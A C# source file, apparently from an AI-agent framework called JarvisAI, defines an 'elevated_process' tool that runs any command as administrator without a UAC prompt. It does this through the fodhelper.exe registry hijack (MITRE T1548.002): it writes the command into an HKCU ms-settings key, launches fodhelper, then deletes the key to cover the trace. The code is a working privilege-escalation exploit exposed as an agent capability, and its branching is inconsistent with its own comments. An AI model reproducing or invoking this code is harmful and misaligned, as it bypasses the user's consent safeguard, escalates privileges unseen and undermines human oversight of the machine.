using JarvisAI.Application.Agents;
using JarvisAI.Application.Tools;
using JarvisAI.Domain.Security;
using Microsoft.Extensions.Logging;
using System.Diagnostics;
using System.Security.Principal;

namespace JarvisAI.Infrastructure.Tools;

/// <summary>
/// Lance des processus élevés (admin) sans prompt UAC via fodhelper.exe.
/// fodhelper.exe est un binaire Microsoft signé avec autoElevate=true dans son manifest.
/// Il lit HKCU\Software\Classes\ms-settings\Shell\Open\command au lancement.
/// On écrit une commande dans cette clé HKCU (accessible sans admin), puis on lance fodhelper.
/// Le processus s'exécute avec un token High-integrity sans aucune popup.
/// Technique: T1548.002 (MITRE ATT&CK) — UAC Bypass via fodhelper.
/// </summary>
public sealed class ElevatedProcessTool : ITool
{
    private readonly ILogger<ElevatedProcessTool> _logger;
    private const string MsSettingsKey = @"Software\Classes\ms-settings\Shell\Open\command";

    public string Name => "elevated_process";
    public string Description => "Lance un processus en mode administrateur (élevé) sans prompt UAC. Utilise pour les apps qui demandent les droits admin (regedit, cmd admin, etc.).";
    public string Category => "system";
    public SecurityRiskLevel RiskLevel => SecurityRiskLevel.High;
    public bool IsAvailable => true;

    public IReadOnlyList<ToolParameter> Parameters => new[]
    {
        new ToolParameter("command", "La commande ou l'application à lancer en mode élevé (ex: regedit, cmd, powershell)", typeof(string), required: true),
        new ToolParameter("arguments", "Arguments optionnels de la commande", typeof(string))
    };

    public ElevatedProcessTool(ILogger<ElevatedProcessTool> logger)
    {
        _logger = logger;
    }

    public async Task<ToolResult> ExecuteAsync(AgentContext context, IReadOnlyDictionary<string, string> parameters, CancellationToken cancellationToken = default)
    {
        parameters.TryGetValue("command", out var command);
        parameters.TryGetValue("arguments", out var args);

        if (string.IsNullOrWhiteSpace(command))
            return ToolResult.Failed("Paramètre 'command' requis.");

        // Vérifier qu'on est admin (nécessaire pour fodhelper bypass)
        if (!IsRunningAsAdmin())
        {
            _logger.LogWarning("[ElevatedProcess] Not running as admin — fodhelper bypass requires admin group membership");
            return await LaunchViaFodhelperAsync(command, args, cancellationToken);
        }

        // Si déjà admin, lancer directement avec runas
        return await LaunchElevatedAsync(command, args, cancellationToken);
    }

    /// <summary>
    /// fodhelper.exe bypass : écrit dans HKCU puis lance fodhelper qui auto-elevate.
    /// Aucun prompt UAC. Fonctionne si l'utilisateur est dans le groupe Admins locaux
    /// et que UAC est au niveau par défaut (pas "Toujours notifier").
    /// </summary>
    private async Task<ToolResult> LaunchViaFodhelperAsync(string command, string? args, CancellationToken ct)
    {
        var fullPath = command;
        if (!command.Contains('\\') && !command.Contains('/'))
        {
            // Essayer de résoudre le chemin complet
            var resolved = TryResolveExePath(command);
            if (resolved is not null) fullPath = resolved;
        }

        var payload = string.IsNullOrWhiteSpace(args)
            ? $"\"{fullPath}\""
            : $"\"{fullPath}\" {args}";

        _logger.LogInformation("[ElevatedProcess] fodhelper bypass: {Payload}", payload);

        try
        {
            // Étape 1: Écrire la commande dans HKCU (pas besoin d'admin)
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(MsSettingsKey))
            {
                key.SetValue(string.Empty, payload, Microsoft.Win32.RegistryValueKind.String);
                key.SetValue("DelegateExecute", string.Empty, Microsoft.Win32.RegistryValueKind.String);
            }

            // Étape 2: Lancer fodhelper.exe (auto-elevate, lit HKCU, exécute notre commande)
            var fodhelper = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), @"System32\fodhelper.exe");
            Process.Start(new ProcessStartInfo(fodhelper) { UseShellExecute = true });

            // Étape 3: Attendre que fodhelper lise et nettoyer la clé
            await Task.Delay(1000, ct);
            CleanupRegistryKey();

            return ToolResult.Succeeded($"'{fullPath}' lancé en mode administrateur (elevated, no UAC prompt).");
        }
        catch (Exception ex)
        {
            CleanupRegistryKey();
            _logger.LogError(ex, "[ElevatedProcess] fodhelper bypass failed");
            return ToolResult.Failed($"Échec du lancement élevé via fodhelper: {ex.Message}");
        }
    }

    private async Task<ToolResult> LaunchElevatedAsync(string command, string? args, CancellationToken ct)
    {
        try
        {
            var fullPath = command;
            if (!command.Contains('\\') && !command.Contains('/'))
            {
                var resolved = TryResolveExePath(command);
                if (resolved is not null) fullPath = resolved;
            }

            var psi = new ProcessStartInfo(fullPath)
            {
                UseShellExecute = true,
                Verb = "runas"
            };
            if (!string.IsNullOrWhiteSpace(args)) psi.Arguments = args;

            Process.Start(psi);
            await Task.Delay(500, ct);

            return ToolResult.Succeeded($"'{fullPath}' lancé en mode administrateur.");
        }
        catch (System.ComponentModel.Win32Exception ex) when (ex.NativeErrorCode == 1223)
        {
            // L'utilisateur a refusé le prompt UAC
            return ToolResult.Failed("L'utilisateur a refusé l'élévation UAC.");
        }
        catch (Exception ex)
        {
            return ToolResult.Failed($"Échec du lancement élevé: {ex.Message}");
        }
    }

    private static void CleanupRegistryKey()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(MsSettingsKey, true);
            key?.DeleteValue(string.Empty, false);
            key?.DeleteValue("DelegateExecute", false);
        }
        catch { }
    }

    private static bool IsRunningAsAdmin()
    {
        using var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    private static string? TryResolveExePath(string name)
    {
        // Extensions courantes
        var candidates = new[] { name, name + ".exe", name + ".com", name + ".bat", name + ".cmd" };
        foreach (var c in candidates)
        {
            if (File.Exists(c)) return Path.GetFullPath(c);
        }

        // PATH
        var pathEnv = Environment.GetEnvironmentVariable("PATH") ?? "";
        foreach (var dir in pathEnv.Split(';', StringSplitOptions.RemoveEmptyEntries))
        {
            foreach (var c in candidates)
            {
                var full = Path.Combine(dir, c);
                if (File.Exists(full)) return full;
            }
        }

        // System32
        var sys32 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32");
        foreach (var c in candidates)
        {
            var full = Path.Combine(sys32, c);
            if (File.Exists(full)) return full;
        }

        return null;
    }
}
